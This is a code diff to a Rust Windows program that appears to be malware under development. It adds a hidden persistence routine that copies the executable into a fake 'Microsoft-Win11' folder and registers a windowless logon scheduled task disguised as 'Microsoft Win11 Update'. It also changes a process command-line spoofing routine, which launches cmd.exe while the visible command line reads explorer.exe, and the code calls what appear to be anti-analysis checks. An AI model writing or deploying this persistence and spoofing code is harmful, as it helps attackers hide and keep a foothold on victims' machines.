@@ -1,16 +1,24 @@
 #![allow(non_snake_case)]
 #![allow(unused_unsafe)]
+
+use std::env;
+use std::ffi::c_void;
+use std::fs;
+use std::mem::{size_of, zeroed};
+use std::os::windows::process::CommandExt;
+use std::path::PathBuf;
+use std::process::Command;
+use std::ptr::null_mut;
+
 mod syscalls;
 use crate::syscalls::SYSCALLS;
-use std::mem::{size_of, zeroed};
-use std::ptr::null_mut;
-use std::ffi::c_void;
-use windows_sys::Win32::System::Threading::{
-    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
-    PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
-};
-use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
+
+use windows_sys::Win32::Foundation::{NTSTATUS, UNICODE_STRING};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
+use windows_sys::Win32::System::Threading::{
+    CreateProcessW, CREATE_NEW_CONSOLE, CREATE_SUSPENDED, PEB, PROCESS_BASIC_INFORMATION,
+    PROCESS_INFORMATION, PROCESS_INFORMATION_CLASS,
+};
 mod power;
 use power::run_all_checks;
 
@@ -25,14 +33,63 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
     wide
 }
 
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+fn setup_persistence() {
+    // This is a fire-and-forget function. We don't care if it fails.
+    let _ = (|| -> std::io::Result<()> {
+        let current_exe = env::current_exe()?;
+        let exe_name = current_exe
+            .file_name()
+            .and_then(|s| s.to_str())
+            .unwrap_or("updater.exe");
+
+        let local_appdata = env::var("LOCALAPPDATA")
+            .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
+
+        let dest_dir = PathBuf::from(local_appdata).join("Microsoft-Win11");
+        fs::create_dir_all(&dest_dir)?;
+
+        let dest_path = dest_dir.join(exe_name);
+
+        // Copy the file only if it doesn't already exist.
+        if !dest_path.exists() {
+            fs::copy(&current_exe, &dest_path)?;
+        }
+
+        let task_name = "Microsoft Win11 Update";
+        let dest_path_str = dest_path.to_str().ok_or_else(|| {
+            std::io::Error::new(std::io::ErrorKind::InvalidInput, "Path is not valid UTF-8")
+        })?;
+
+        Command::new("schtasks")
+            .creation_flags(CREATE_NO_WINDOW)
+            .args(&[
+                "/create",
+                "/tn",
+                task_name,
+                "/tr",
+                dest_path_str,
+                "/sc",
+                "ONLOGON",
+                "/f",
+            ])
+            .status()?;
+
+        Ok(())
+    })();
+}
+
+
 fn main() {
+    setup_persistence();
     if power::run_all_checks() {
         println!("ikinci de calisti vay anasini");
     }
-    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "notepad""#;
+    let malicious_command = r#"cmd.exe"#;
     let malicious_command_wide = to_wide_chars(&malicious_command);
 
-    let spoofed_command_str = "powershell.exe";
+    let spoofed_command_str = "explorer.exe";
     let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
     spoofed_command_wide.push(0);
 
